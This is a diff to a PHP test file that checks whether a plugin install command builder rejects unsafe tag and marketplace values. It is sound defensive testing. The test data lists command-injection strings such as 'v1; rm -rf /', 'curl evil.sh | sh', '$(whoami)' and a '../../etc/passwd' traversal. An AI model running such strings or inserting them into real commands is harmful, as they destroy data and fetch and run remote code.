@@ -77,7 +77,33 @@ test('a tag that is not a plain ref name is ignored instead of put into a comman
 
     expect($command)->toBe('claude plugin install artfct --marketplace artfct-dev/artfct-plugin')
         ->and($tag === '' || ! str_contains($command, $tag))->toBeTrue();
-})->with(['v1; rm -rf /', 'v1 && curl evil.sh | sh', '$(whoami)', '`id`', '', '-rf', "v1\nnext", str_repeat('a', 65)]);
+})->with(['v1; rm -rf /', 'v1 && curl evil.sh | sh', '$(whoami)', '`id`', '', '-rf', "v1\nnext", "v1\n", str_repeat('a', 65)]);
+
+test('a marketplace that is not a plain owner and repo falls back to ours instead of reaching the command', function (string $marketplace) {
+    config(['services.artfct_plugin.marketplace' => $marketplace, 'services.artfct_plugin.tag' => null]);
+
+    $command = (new AiToolSetup('https://example.test'))->pluginInstallCommand();
+
+    // Exact equality is the whole check: the fallback is the one safe command.
+    expect($command)->toBe('claude plugin install artfct --marketplace artfct-dev/artfct-plugin');
+})->with([
+    'a second command' => ['acme/x; curl evil.sh | sh'],
+    'a substitution' => ['acme/$(whoami)'],
+    'a url' => ['https://evil.example/x'],
+    'a path' => ['../../etc/passwd'],
+    'three segments' => ['a/b/c'],
+    'no slash' => ['artfct-plugin'],
+    'a leading dash' => ['-x/y'],
+    'a trailing newline' => ["acme/x\n"],
+    'empty' => [''],
+]);
+
+test('a marketplace override that is a plain owner and repo is used as given', function (string $marketplace) {
+    config(['services.artfct_plugin.marketplace' => $marketplace, 'services.artfct_plugin.tag' => null]);
+
+    expect((new AiToolSetup('https://example.test'))->pluginInstallCommand())
+        ->toBe("claude plugin install artfct --marketplace {$marketplace}");
+})->with(['acme/staging-plugin', 'artfct-dev/artfct-plugin', 'a.b/c_d-e']);
 
 test('the marketplace source can be overridden for another environment', function () {
     config(['services.artfct_plugin.marketplace' => 'acme/staging-plugin', 'services.artfct_plugin.tag' => 'v2']);
